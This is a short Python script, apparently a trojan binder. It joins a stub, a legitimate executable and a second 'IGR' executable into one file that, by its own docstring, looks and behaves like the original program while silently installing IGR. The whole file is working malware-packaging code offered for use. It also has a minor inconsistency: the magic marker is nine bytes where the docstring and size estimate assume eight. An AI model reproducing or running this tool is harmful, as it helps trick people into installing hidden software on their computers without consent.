"""
IGR EXE Binder - Merges stub.exe + legitimate exe + IGR exe into a single bound executable.
The bound exe appears and behaves like the original program, but silently installs IGR.

Usage:
    python binder.py <stub.exe> <legitimate.exe> <igr.exe> <output.exe>

File format of bound exe:
    [stub.exe bytes][legit.exe bytes][igr.exe bytes][legit_size:8][igr_size:8][MAGIC:8]
"""

import struct
import sys
import os

MAGIC = b"IGR_BIND\x00"


def bind(stub_path: str, legit_path: str, igr_path: str, output_path: str) -> bool:
    """Combine stub + legit exe + IGR exe into a single bound executable."""
    if not os.path.exists(stub_path):
        print(f"  ERROR: Stub not found: {stub_path}")
        return False
    if not os.path.exists(legit_path):
        print(f"  ERROR: Legitimate exe not found: {legit_path}")
        return False
    if not os.path.exists(igr_path):
        print(f"  ERROR: IGR exe not found: {igr_path}")
        return False

    legit_size = os.path.getsize(legit_path)
    igr_size = os.path.getsize(igr_path)

    print(f"  Stub:       {os.path.getsize(stub_path):,} bytes")
    print(f"  Legit exe:  {legit_size:,} bytes")
    print(f"  IGR exe:    {igr_size:,} bytes")
    print(f"  Output:     {os.path.getsize(stub_path) + legit_size + igr_size + 24:,} bytes (estimated)")

    try:
        with open(output_path, "wb") as out:
            with open(stub_path, "rb") as f:
                out.write(f.read())
            with open(legit_path, "rb") as f:
                out.write(f.read())
            with open(igr_path, "rb") as f:
                out.write(f.read())
            out.write(struct.pack("<Q", legit_size))
            out.write(struct.pack("<Q", igr_size))
            out.write(MAGIC)
        print(f"  Bound exe written: {output_path}")
        print(f"  Final size: {os.path.getsize(output_path):,} bytes")
        return True
    except Exception as e:
        print(f"  ERROR: Binding failed: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python binder.py <stub.exe> <legitimate.exe> <igr.exe> <output.exe>")
        sys.exit(1)
    success = bind(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    sys.exit(0 if success else 1)
